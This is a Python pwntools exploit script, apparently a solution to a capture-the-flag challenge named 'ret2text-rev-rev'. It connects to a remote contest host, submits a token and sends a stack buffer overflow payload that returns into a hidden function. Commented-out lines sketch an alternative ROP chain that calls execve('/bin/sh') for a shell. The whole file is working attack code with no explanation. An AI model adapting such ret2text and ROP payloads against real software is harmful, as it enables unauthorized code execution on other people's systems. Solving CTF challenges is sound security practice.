#!/usr/bin/python3
#-*- coding: utf-8 -*-
#  author: @eastXueLian

from pwn import *
import sys

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

LOCAL = 0
elf = ELF("./ret2text-rev-rev", checksec=False)
if LOCAL:
    io = process(["docker", "run", "-i", "2bf1c336ac5a"])
else:
    remote_service = "ctf.nbs.jonbgua.com 32129"
    remote_service = remote_service.strip().split(" ")
    io = remote(remote_service[0], int(remote_service[1]))


rl = lambda a=False : io.recvline(a)
ru = lambda a,b=True : io.recvuntil(a,b)
rn = lambda x : io.recvn(x)
s = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sa = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a,b)
ia = lambda : io.interactive()
dbg = lambda text=None : gdb.attach(io, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    if LOCAL:
        lg("io.pid")
        input()
    pass

ru(b"token")
sl(b"17:MEUCIFtZ0Xqk5CauMwvYNQClJbNoG1bSMwpNLmbZCcAslJ+yAiEA9vQFGEWs9V0MpLGAWEbmgtJFRkpgzBH03sDXe6gys/g=")

ru(b"Challenge")
ru(b":")
sl(i2b(1))

#  syscall_ret = 0x0000000000416c44
#  pop_rdi_ret = 0x0000000000401862
#  pop_rsi_ret = 0x000000000040f15e
#  pop_rdx_ret = 0x000000000040176f
#  pop_rax_ret = 0x0000000000414df4
#  str_bin_sh  = next(elf.search(b"/bin/sh\x00"))

ru(b'Give me your data: \n')
payload = b"a"*(0x20+8)
#  payload += p64(pop_rdi_ret) + p64(str_bin_sh)
#  payload += p64(pop_rsi_ret) + p64(0)
#  payload += p64(pop_rdx_ret) + p64(0)
#  payload += p64(pop_rax_ret) + p64(59)
#  payload += p64(syscall_ret)
#  payload += p64(elf.sym['gift'])
payload += p64(0x0000000000401283+1)
payload += p64(0x401196)
s(payload)



ia()
